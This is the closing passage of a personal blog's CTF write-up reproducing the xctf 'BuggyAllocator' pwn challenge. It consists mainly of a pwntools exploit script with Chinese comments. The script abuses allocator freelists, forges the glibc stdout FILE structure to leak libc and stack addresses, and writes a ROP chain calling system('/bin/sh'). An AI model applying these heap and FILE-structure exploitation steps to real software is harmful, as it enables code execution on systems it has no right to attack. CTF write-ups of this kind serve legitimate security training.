dealloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    
<span class="token comment">#尝试分配0x38,由于对应freelist为空,在刚释放的0x80(0号)上建立链表并填充0x38的freelist</span>
alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span>

<span class="token comment">#正常取出一个堆块</span>
alloc<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span>

    
<span class="token comment">#取出stdout, 使next chunk为 _p_2_1_stdout_</span>
alloc<span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b'\x80'</span><span class="token punctuation">)</span> <span class="token comment">#覆盖stdout的低位,stdout低位原本就是 \x80</span>
    
<span class="token comment"># pwndbg> p _p_2_1_stdout_</span>
<span class="token comment"># $2 = &#123;</span>
<span class="token comment">#   file = &#123;</span>
<span class="token comment">#     _flags = -72542208,  //0xfbad1800</span>
<span class="token comment">#     _io_read_ptr = 0x0, </span>
<span class="token comment">#     _io_read_end = 0x0, </span>
<span class="token comment">#     _io_read_base = 0x0, </span>
<span class="token comment">#     _io_write_base = 0x7ffff7dd2600 &lt;_io_2_1_stderr_+192> 'A' &lt;repeats 32 times>, //低字节修改成了00</span>
<span class="token comment">#     _io_write_ptr = 0x7ffff7dd26a3 &lt;_io_2_1_stdout_+131> "\n", </span>
<span class="token comment">#     _io_write_end = 0x7ffff7dd26a3 &lt;_io_2_1_stdout_+131> "\n", </span>
<span class="token comment">#     _io_buf_base = 0x7ffff7dd26a3 &lt;_io_2_1_stdout_+131> "\n", </span>
<span class="token comment">#     _io_buf_end = 0x7ffff7dd26a4 &lt;_io_2_1_stdout_+132> "", </span>
<span class="token comment">#     _io_save_base = 0x0, </span>
<span class="token comment">#     _io_backup_base = 0x0, </span>
<span class="token comment">#     _op_save_end = 0x0, </span>
<span class="token comment">#     _markers = 0x0, </span>
<span class="token comment">#     _chain = 0x7ffff7dd18e0 &lt;_p_2_1_stdin_>, </span>
<span class="token comment">#     _fileno = 1, </span>
<span class="token comment">#     _flags2 = 0, </span>
<span class="token comment">#     _old_offset = -1, </span>
<span class="token comment">#     _cur_column = 0, </span>
<span class="token comment">#     _vtable_offset = 0 '\000', </span>
<span class="token comment">#     _shortbuf = "\n", </span>
<span class="token comment">#     _lock = 0x7ffff7dd3780 &lt;_p_stdfile_1_lock>, </span>
<span class="token comment">#     _offset = -1, </span>
<span class="token comment">#     _codecvt = 0x0, </span>
<span class="token comment">#     _wide_data = 0x7ffff7dd17a0 &lt;_p_wide_data_1>, </span>
<span class="token comment">#     _freeres_list = 0x0, </span>
<span class="token comment">#     _freeres_buf = 0x0, </span>
<span class="token comment">#     __pad5 = 0, </span>
<span class="token comment">#     _mode = -1, </span>
<span class="token comment">#     _unused2 = '\000' &lt;repeats 19 times></span>
<span class="token comment">#   &#125;, </span>
<span class="token comment">#   vtable = 0x7ffff7dd06e0 &lt;_p_file_jumps></span>
<span class="token comment"># &#125;</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#伪造_p_2_1_stdout_读取libc地址</span>

<span class="token comment"># gdb.attach(p)</span>
alloc<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
environ_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>
pop_rdi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x2a3e5</span>
ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x2a3e6</span>

<span class="token comment">#释放再取回,伪造_p_2_1_stdout_泄露environ得到栈地址</span>
dealloc<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>environ_addr<span class="token punctuation">,</span>environ_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span>environ_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
alloc<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>


stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x140</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_addr -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment">#利用残留数据，布置任意地址写用的堆块</span>
dealloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span>
dealloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    
<span class="token comment">#尝试分配0x40,由于对应freelist为空,在刚释放的0x80(1号)上建立链表并填充0x40的freelist</span>
alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>

alloc<span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
alloc<span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/06/04/litctf2024-pwn/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/05/27/DragonKnightCTF-pwn/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-05-30 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>51</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>52</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">xctf_BuggyAllocator复现</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
